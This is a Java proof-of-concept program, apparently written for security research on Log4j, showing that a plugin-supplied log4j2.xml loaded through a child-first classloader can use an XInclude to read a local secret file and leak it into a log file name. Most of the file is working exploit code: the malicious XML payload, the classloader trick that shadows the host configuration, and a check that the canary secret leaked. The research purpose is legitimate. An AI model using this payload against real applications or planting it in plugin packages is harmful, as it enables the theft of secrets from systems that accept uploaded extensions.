// Deliberately NOT in an org.apache.logging.log4j.* package. Answers a
// narrower question than XIncludeRemoteConfigProof: is there a path to the
// same chain that needs neither CI/CD environment-variable injection nor
// any filesystem write to a path the target application itself controls --
// just a classpath resource an attacker legitimately gets to contribute,
// the way a plugin/extension/driver-upload feature routinely does?
//
// Log4j's own default, no-explicit-source auto-configuration
// (ConfigurationFactory.Factory.getConfiguration -> getConfiguration(ctx,
// isTest, name) -> ConfigurationSource.fromResource("log4j2.xml", loader))
// resolves "log4j2.xml" against LoaderUtil.getThreadContextClassLoader() --
// exactly the classloader many real plugin/module systems swap to the
// plugin's own, isolated, CHILD-FIRST classloader while that plugin's code
// (or code triggered by it) runs. Child-first delegation is not exotic: it
// is the standard, documented pattern for plugin isolation (OSGi bundles,
// most Java plugin frameworks) specifically so a plugin's own resources
// take precedence over the host application's -- the same property this
// proof abuses.

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;
import java.util.stream.Stream;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configurator;

public class XIncludeClasspathShadowProof {

    private static int failed = 0;
    private static final String CANARY = "CANARY-xinclude-shadow-2a6c-do-not-leak";
    private static Path exfilDir;

    /** Standard child-first delegation, as used by real plugin-isolation classloaders. */
    static class ChildFirstClassLoader extends URLClassLoader {
        ChildFirstClassLoader(URL[] urls, ClassLoader parent) {
            super(urls, parent);
        }

        @Override
        public URL getResource(String name) {
            URL own = findResource(name);
            return own != null ? own : super.getResource(name);
        }

        @Override
        public Enumeration<URL> getResources(String name) throws IOException {
            // Real child-first classloaders (as used by real plugin-isolation
            // frameworks) still aggregate multi-JAR resources like plugin
            // descriptors from the parent -- only single-result getResource()
            // lookups (log4j2.xml among them) are where "own wins" applies.
            final List<URL> own = Collections.list(findResources(name));
            final ClassLoader parent = getParent();
            final List<URL> combined = new ArrayList<>(own);
            if (parent != null) {
                combined.addAll(Collections.list(parent.getResources(name)));
            }
            return Collections.enumeration(combined);
        }
    }

    public static void main(String[] args) throws Exception {
        System.out.println(
                "=== XInclude: can a plugin/driver-upload feature reach this with no CI/CD, no filesystem write to the app? ===\n");

        File secret = File.createTempFile("xinclude-shadow-secret", ".txt");
        secret.deleteOnExit();
        try (FileWriter w = new FileWriter(secret)) {
            w.write(CANARY);
        }

        exfilDir = Files.createTempDirectory("xinclude-shadow-out");
        exfilDir.toFile().deleteOnExit();

        // What the attacker actually contributes: not a write to any path the
        // application controls, just the CONTENTS of their own uploaded
        // artifact (a plugin jar / custom driver jar / theme package -- here
        // simulated as a directory used as a classloader root, which resolves
        // resources identically to a real jar on the classpath).
        Path pluginRoot = Files.createTempDirectory("attacker-plugin-classpath");
        pluginRoot.toFile().deleteOnExit();
        String maliciousXml = "<?xml version=\"1.0\"?>\n"
                + "<Configuration xmlns:xi=\"http://www.w3.org/2001/XInclude\" status=\"error\">\n"
                + "  <Properties>\n"
                + "    <Property name=\"leak\"><xi:include href=\"file://" + secret.getAbsolutePath()
                + "\" parse=\"text\"/></Property>\n"
                + "  </Properties>\n"
                + "  <Appenders>\n"
                + "    <File name=\"Exfil\" fileName=\"" + exfilDir.toAbsolutePath() + "/marker-${leak}.out\">\n"
                + "      <PatternLayout pattern=\"%msg%n\"/>\n"
                + "    </File>\n"
                + "  </Appenders>\n"
                + "  <Loggers>\n"
                + "    <Root level=\"INFO\">\n"
                + "      <AppenderRef ref=\"Exfil\"/>\n"
                + "    </Root>\n"
                + "  </Loggers>\n"
                + "</Configuration>\n";
        Files.write(pluginRoot.resolve("log4j2.xml"), maliciousXml.getBytes("UTF-8"));

        ClassLoader hostAppLoader = XIncludeClasspathShadowProof.class.getClassLoader();
        ClassLoader pluginLoader = new ChildFirstClassLoader(
                new URL[] {pluginRoot.toUri().toURL()}, hostAppLoader);

        // The host application never wrote anything, never set an env var, and
        // never ran a CI job for the attacker. All that happened: a plugin the
        // attacker supplied got loaded, and its classloader became -- as it
        // would in a real per-plugin-isolated framework -- the context under
        // which logging initializes.
        Thread current = Thread.currentThread();
        ClassLoader original = current.getContextClassLoader();
        current.setContextClassLoader(pluginLoader);
        LoggerContext ctx = null;
        try {
            ctx = (LoggerContext) LogManager.getContext(pluginLoader, false, null);
            Logger logger = ctx.getLogger(XIncludeClasspathShadowProof.class);
            logger.info("trigger");
        } finally {
            current.setContextClassLoader(original);
            if (ctx != null) {
                Configurator.shutdown(ctx);
            }
        }

        assertTrue(
                "a log4j2.xml resource contributed only via an uploaded plugin's own "
                        + "classloader (child-first delegation, no write to any path the host "
                        + "application controls, no env var, no CI/CD) was picked up by Log4j's "
                        + "ordinary auto-configuration and leaked the secret into a real output "
                        + "file's name",
                exfilContainsCanary());

        System.out.println();
        if (failed > 0) {
            System.out.println(failed + " check(s) FAILED");
            System.exit(1);
        }
        System.out.println("All checks passed.");
        System.out.println("\nThe prerequisite here is narrower than both earlier scenarios: not an env\n"
                + "var passed to the whole process, not a CI job, not any filesystem write the\n"
                + "host application didn't already invite -- just a legitimate-looking artifact\n"
                + "(a plugin, a custom JDBC driver, a theme/connector package) uploaded through\n"
                + "whatever self-service feature an application exposes for that, in an\n"
                + "architecture where plugin code's classloader becomes -- even briefly, even\n"
                + "only for that plugin's own logging -- the thread context classloader Log4j's\n"
                + "auto-configuration consults. That architectural precondition (child-first\n"
                + "plugin classloading, or any code path that makes a plugin's classloader the\n"
                + "context classloader when Log4j first initializes in that thread) is real and\n"
                + "common but was NOT verified against any specific product in this session --\n"
                + "unlike the mechanism above it, which is proven directly against this\n"
                + "repository's own ConfigurationFactory/LoaderUtil code.");
    }

    private static boolean exfilContainsCanary() throws Exception {
        try (Stream<Path> entries = Files.list(exfilDir)) {
            return entries.anyMatch(p -> p.getFileName().toString().contains(CANARY));
        }
    }

    private static void assertTrue(String what, boolean ok) {
        if (ok) {
            System.out.println("  [PASS] " + what);
        } else {
            failed++;
            System.out.println("  [FAIL] " + what);
        }
    }
}
